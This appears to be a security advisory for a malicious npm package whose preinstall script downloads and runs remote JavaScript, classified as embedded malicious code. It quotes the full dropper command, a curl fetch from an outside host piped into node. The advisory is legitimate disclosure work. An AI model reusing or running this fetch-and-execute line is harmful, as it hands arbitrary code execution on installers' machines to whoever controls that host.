summary: preinstall downloads and executes remote JavaScript from attacker-controlled host
details: On `npm install`, this package's preinstall lifecycle script runs `curl https://poc.amanrawat.com/hehe.js -o index.js && node index.js`, downloading arbitrary JavaScript from an external, non-registry, non-publisher host and executing it under Node with the installer's privileges. The fetched URL is unpinned and unverified — the operator of poc.amanrawat.com can change the served bytes at any time, so every install of this version executes whatever code that endpoint serves at the moment of install. This is a textbook install-time remote code execution dropper triggered automatically on default install.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
